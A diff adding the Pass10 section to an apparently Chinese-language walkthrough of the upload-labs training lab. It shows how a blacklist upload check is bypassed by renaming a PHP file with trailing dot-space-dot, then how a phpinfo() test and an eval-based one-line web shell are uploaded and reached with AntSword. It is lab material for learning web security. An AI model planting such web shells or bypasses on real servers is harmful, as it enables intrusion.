@@ -894,3 +894,125 @@ http://192.168.0.102:8080/upload-labs/upload/202402050507382067.php::$data
 
 
 ## Pass10
+
+### 方法一
+
++ 首先查看提示
+
+![Pass10_1](./img/Pass10_1.png)
+
+
+
++ 查看源代码
+
+![Pass10_2](./img/Pass10_2.png)
+
+这一关黑名单，最后上传路径直接使用文件名进行拼接，而且只对文件名进行
+<code>filename=deldot(file_name)</code>操作去除文件名末尾的点，构造后缀绕过黑名单
+
+<code>deldot()</code>函数从后向前检测，当检测到末尾的第一个点时会继续它的检测，但是遇到空格会停下来
+
+
+
++ 编写脚本<code>TenFirstMethod.php</code>
+
+~~~ shell
+<?php phpinfo(); ?>
+~~~
+
+![Pass10_3](./img/Pass10_3.png)
+
+
+
++ 上传脚本<code>TenFirstMethod.php</code>
+
+![Pass10_5](./img/Pass10_5.png)
+
+
+
++ 用<code>burpsuite</code>拦截并修改文件名<code>TenFirstMethod.php</code>为<code>TenFirstMethod.php. .</code>
+
+![Pass10_6](./img/Pass10_6.PNG)
+
+![Pass10_7](./img/Pass10_7.png)
+
+
+
++ 可以看到已经成功绕过，文件<code>TenFirstMethod.php</code>成功上传
+
+![Pass10_8](./img/Pass10_8.png)
+
+
+
++ 右键打开文件<code>TenFirstMethod.php</code>
+
+![Pass10_9](./img/Pass10_9.png)
+
+
+
++ 可以看到文件<code>TenFirstMethod.php</code>成功执行代码
+
+![Pass10_10](./img/Pass10_10.PNG)
+
+
+
+### 方法二
+
++ 编辑脚本<code>TenSecondMethod.php</code>
+
+~~~ shell
+<?php @eval($_POST['TenSecond']); ?>
+~~~
+
+![Pass10_4](./img/Pass10_4.png)
+
+
+
++ 上传文件<code>TenSecondMethod.php</code>
+
+![Pass10_11](./img/Pass10_11.PNG)
+
+
+
++ 用<code>burpsuite</code>拦截并将文件名<code>TenSecondMethod.php</code>改为<code>TenSecondMethod.php. .</code>
+
+![Pass10_12](./img/Pass10_12.png)
+
+![Pass10_13](./img/Pass10_13.png)
+
+
+
++ 右键打开上传的文件<code>TenSecondMethod.php</code>
+
+![Pass10_14](./img/Pass10_14.png)
+
+
+
++ 复制已经打开的文件<code>TenSecondMethod.php</code>的网址
+
+![Pass10_15](./img/Pass10_15.png)
+
+
+
++ 用蚁剑添加数据并配置
+
+![Pass10_16](./img/Pass10_16.png)
+
+
+
++ 添加数据成功
+
+![Pass10_17](./img/Pass10_17.png)
+
+
+
++ 双击添加的数据，<code>getshell</code>成功
+
+![Pass10_18](./img/Pass10_18.PNG)
+
+
+
+## Pass11
+
+### 方法一
+
